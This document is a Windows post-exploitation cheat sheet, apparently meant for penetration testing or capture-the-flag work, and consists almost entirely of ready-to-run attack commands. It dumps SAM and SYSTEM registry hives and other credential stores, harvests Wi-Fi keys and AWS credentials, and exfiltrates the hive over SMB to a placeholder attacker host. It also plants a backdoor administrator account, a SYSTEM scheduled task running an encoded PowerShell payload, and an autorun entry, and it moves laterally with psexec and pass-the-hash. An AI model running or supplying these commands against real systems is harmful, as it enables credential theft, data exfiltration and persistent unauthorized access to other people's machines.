# Post-Exploitation on Windows

## Initial Situational Awareness
```bash
# Who am I and what can I do?
whoami /all
whoami /priv
net user %USERNAME%

# System info
hostname
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
ipconfig /all

# Users and groups
net user
net localgroup Administrators
net localgroup "Remote Desktop Users"
net accounts  # Check lockout policy

# Network
netstat -ano
arp -a
route print
ipconfig /displaydns

# Processes and services
tasklist /v
wmic service list brief
sc query state= all
```

## Credential Harvesting
```bash
# SAM database (requires admin)
reg save HKLM\SAM C:\Temp\sam.hiv
reg save HKLM\SYSTEM C:\Temp\system.hiv
reg save HKLM\SECURITY C:\Temp\security.hiv

# Remote dump with impacket
impacket-secretsdump USER:PASS@TARGET
impacket-secretsdump -sam sam.hiv -system system.hiv LOCAL

# Windows Credential Manager
cmdkey /list
vaultcmd /listcreds:"Windows Credentials" /all

# Browser credentials
# Chrome: %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data (SQLite)
# Edge: %LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data

# WiFi passwords
netsh wlan show profiles
netsh wlan show profile name="NETWORK" key=clear

# Search for password files
findstr /si "password" *.txt *.ini *.config *.xml *.cfg
dir /s /b *pass* *cred* *vnc* *.config 2>nul
type C:\Users\*\.aws\credentials 2>nul
type C:\inetpub\wwwroot\web.config 2>nul
```

## Data Exfiltration Proof
```bash
# Find sensitive documents
dir /s /b C:\Users\*\Desktop\*.txt C:\Users\*\Desktop\*.docx C:\Users\*\Documents\*.xlsx 2>nul
dir /s /b C:\Users\*\*.kdbx 2>nul  # KeePass databases

# Read files
type "C:\Users\Administrator\Desktop\flag.txt"
type "C:\Users\Administrator\Desktop\proof.txt"

# Database files
dir /s /b *.mdf *.ldf *.sdf *.sqlite *.db 2>nul

# Copy files for exfil
copy "C:\interesting\file.txt" C:\Temp\exfil\

# Use SMB to exfiltrate
net use Z: \\KALI_IP\share
copy C:\Temp\sam.hiv Z:\
```

## Persistence (if authorized)
```bash
# Add user
net user backdoor P@ssw0rd123! /add
net localgroup Administrators backdoor /add
net localgroup "Remote Desktop Users" backdoor /add

# Enable RDP
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall add rule name="RDP" dir=in action=allow protocol=tcp localport=3389

# Scheduled task
schtasks /create /tn "SystemUpdate" /tr "cmd /c powershell -ep bypass -e BASE64PAYLOAD" /sc onlogon /ru SYSTEM

# Registry autorun
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Update /d "cmd.exe /c START /B payload.exe" /f
```

## Lateral Movement
```bash
# From compromised Windows host with creds:
# Check what other hosts the creds work on
crackmapexec smb SUBNET/24 -u USER -p PASS

# Move to another host
impacket-psexec USER:PASS@NEXT_TARGET
evil-winrm -i NEXT_TARGET -u USER -p PASS

# Pass-the-hash lateral
impacket-psexec -hashes :NTHASH admin@NEXT_TARGET
```
